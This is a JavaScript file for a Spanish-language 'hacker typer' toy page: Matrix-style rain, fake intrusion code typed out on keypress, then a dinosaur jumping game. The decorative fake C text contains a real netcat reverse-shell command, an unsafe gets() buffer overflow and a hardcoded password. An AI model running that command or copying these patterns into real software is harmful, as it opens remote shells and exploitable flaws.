// --------------------------------------------------------
// 1. FONDO MATRIX (Lluvia de 1s y 0s)
// --------------------------------------------------------
const canvas = document.getElementById('matrixCanvas');
const ctx = canvas.getContext('2d');
canvas.width = window.innerWidth;
canvas.height = window.innerHeight;

const chars = "01";
const fontSize = 16;
const columns = canvas.width / fontSize;
const drops = [];
for (let x = 0; x < columns; x++) drops[x] = 1;

function drawMatrix() {
    ctx.fillStyle = "rgba(0, 0, 0, 0.05)";
    ctx.fillRect(0, 0, canvas.width, canvas.height);
    ctx.fillStyle = "#00ffff"; // Azul brillante
    ctx.font = fontSize + "px monospace";

    for (let i = 0; i < drops.length; i++) {
        const text = chars.charAt(Math.floor(Math.random() * chars.length));
        ctx.fillText(text, i * fontSize, drops[i] * fontSize);
        if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
            drops[i] = 0;
        }
        drops[i]++;
    }
}
setInterval(drawMatrix, 50);

// --------------------------------------------------------
// 2. LÓGICA DEL HACKER TYPER
// --------------------------------------------------------
const terminal = document.getElementById('terminal-output');
const window1 = document.getElementById('mini-window-1');
const window2 = document.getElementById('mini-window-2');
const asciiDisplay = document.getElementById('ascii-art-display');
const hackProgress = document.getElementById('hack-progress');
const gameContainer = document.getElementById('game-container');

let codeIndex = 0;
let keysPressed = 0;
const maxKeys = 150; // Cantidad de teclas para terminar el "hackeo"

// Texto simulado muy largo
const fakeCode = `#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <unistd.h>\n\n/* Iniciando protocolo de intrusion */\ntypedef struct {\n    char ip[16];\n    int puerto;\n    char payload[1024];\n} Target;\n\nvoid bypass_firewall(Target *t) {\n    printf("[*] Analizando puertos de %s...\\n", t->ip);\n    for(int i=0; i<65535; i++) {\n        if(i == 443 || i == 80) {\n            printf("[+] Puerto abierto: %d\\n", i);\n            sleep(1);\n        }\n    }\n}\n\nint main() {\n    // Extrayendo credenciales...\n    char *password = "admin123";\n    while(1) {\n        printf("Inyectando payload...\\n");\n        system("clear");\n        printf("Accediendo al núcleo...\\n");\n    }\n    return 0;\n}\n\n/* ==== SECCION DE EXPLOITS ==== */\nvoid exploit_kernel() {\n    // Buffer overflow\n    char buffer[64];\n    gets(buffer);\n}\n\nvoid reverse_shell() {\n    // Conectando a C2...\n    // nc -e /bin/sh 192.168.1.100 4444\n}\n\n// FIN DEL SCRIPT... PREPARANDO JUEGO...\n`;

const asciiArts = [
`   ( o o )
  (  _  )
   \\___/  <-- Basket`,
`  <3 <3 <3
 <3     <3
  <3   <3
    <3`,
`    /\\
   /  \\
  |    |
  |    |
 /|    |\\
/_|____|_\\  <-- Rocket`,
`   _____
  /     \\
 |       |
 |       |
  \\_____/  <-- Gear`,
`   /\\ /\\
  /  V  \\
  \\  ^  /
   \\|_|/  <-- Spider`
];

function typeCode(e) {
    if (gameContainer.classList.contains('hidden') === false) return; // Pausar si el juego está activo
    if (e.key === "Escape") {
        location.reload();
        return;
    }
    
    // Ignorar teclas de control
    if (e.key.length !== 1 && e.key !== "Enter") return;

    keysPressed++;

    // Efecto de máquina de escribir (3 caracteres por tecla)
    for (let i = 0; i < 3; i++) {
        if (codeIndex >= fakeCode.length) {
            codeIndex = 0; // Reiniciar si llega al final
        }
        terminal.textContent += fakeCode[codeIndex];
        codeIndex++;
    }
    
    // Autoscroll
    window.scrollTo(0, document.body.scrollHeight);

    // Eventos basados en las teclas presionadas
    if (keysPressed === 20) {
        window1.classList.remove('hidden');
    }
    if (keysPressed === 40) {
        window2.classList.remove('hidden');
    }

    // Lógica de la ventana 1 (ASCII progresivo)
    if (keysPressed > 20 && keysPressed <= 100) {
        const progress = Math.floor((keysPressed - 20) / 15);
        if (progress < asciiArts.length) {
            asciiDisplay.textContent = asciiArts[progress];
        }
    }

    // Lógica de la ventana 2 (Barra de progreso)
    if (keysPressed > 40) {
        let percent = Math.min(((keysPressed - 40) / 110) * 100, 100);
        hackProgress.style.width = percent + "%";
    }

    // TRIGGER DEL JUEGO (Al llegar al máximo)
    if (keysPressed >= maxKeys) {
        startGame();
    }
}

document.addEventListener('keydown', typeCode);

// --------------------------------------------------------
// 3. EL JUEGO DEL DINOSAURIO (MODO EXTREMO)
// --------------------------------------------------------
const dinoCanvas = document.getElementById('dinoCanvas');
const dCtx = dinoCanvas.getContext('2d');
const gameOverMsg = document.getElementById('game-over-msg');

let dino = { x: 50, y: 200, width: 20, height: 40, vy: 0, gravity: 0.6, jumpForce: -10, grounded: true };
let obstacles = [];
let frameCount = 0;
let gameLoop;
let isGameOver = false;
let gameSpeed = 8; // Velocidad extrema
let score = 0;

function jump() {
    if (dino.grounded && !isGameOver) {
        dino.vy = dino.jumpForce;
        dino.grounded = false;
    }
}

document.addEventListener('keydown', (e) => {
    if (!gameContainer.classList.contains('hidden')) {
        if (e.code === 'Space' || e.code === 'ArrowUp') {
            if (isGameOver) {
                resetGame();
            } else {
                jump();
            }
        }
    }
});

function startGame() {
    terminal.style.display = 'none';
    window1.classList.add('hidden');
    window2.classList.add('hidden');
    gameContainer.classList.remove('hidden');
    resetGame();
}

function resetGame() {
    dino.y = 200;
    dino.vy = 0;
    dino.grounded = true;
    obstacles = [];
    frameCount = 0;
    score = 0;
    gameSpeed = 8;
    isGameOver = false;
    gameOverMsg.classList.add('hidden');
    
    if (gameLoop) cancelAnimationFrame(gameLoop);
    updateGame();
}

function updateGame() {
    if (isGameOver) return;

    frameCount++;
    score++;

    // Física del dino
    dino.vy += dino.gravity;
    dino.y += dino.vy;
    if (dino.y >= 200) {
        dino.y = 200;
        dino.vy = 0;
        dino.grounded = true;
    }

    // Generar obstáculos
    if (frameCount % Math.floor(Math.random() * 40 + 40) === 0) {
        obstacles.push({ x: 800, y: 220, width: 20, height: 20 });
    }

    // Mover obstáculos y detectar colisión
    for (let i = 0; i < obstacles.length; i++) {
        obstacles[i].x -= gameSpeed;
        
        // Colisión
        if (
            dino.x < obstacles[i].x + obstacles[i].width &&
            dino.x + dino.width > obstacles[i].x &&
            dino.y < obstacles[i].y + obstacles[i].height &&
            dino.y + dino.height > obstacles[i].y
        ) {
            isGameOver = true;
            gameOverMsg.classList.remove('hidden');
            gameOverMsg.textContent = "GAME OVER - Puntos: " + score + " - ESPACIO para reiniciar";
        }
    }

    // Limpiar obstáculos fuera de pantalla
    obstacles = obstacles.filter(obs => obs.x + obs.width > 0);

    // Aumentar velocidad progresivamente (Modo extremo)
    if (frameCount % 500 === 0) gameSpeed += 0.5;

    // Dibujar
    dCtx.fillStyle = "#000";
    dCtx.fillRect(0, 0, 800, 300);
    
    // Dibujar suelo
    dCtx.strokeStyle = "#00ffff";
    dCtx.beginPath();
    dCtx.moveTo(0, 250);
    dCtx.lineTo(800, 250);
    dCtx.stroke();

    // Dibujar Dino
    dCtx.fillStyle = "#00ffff";
    dCtx.fillRect(dino.x, dino.y, dino.width, dino.height);

    // Dibujar Obstáculos
    dCtx.fillStyle = "red";
    obstacles.forEach(obs => {
        dCtx.fillRect(obs.x, obs.y, obs.width, obs.height);
    });

    // Dibujar Puntos
    dCtx.fillStyle = "#00ffff";
    dCtx.font = "20px monospace";
    dCtx.fillText("PUNTOS: " + score, 650, 40);

    gameLoop = requestAnimationFrame(updateGame);
}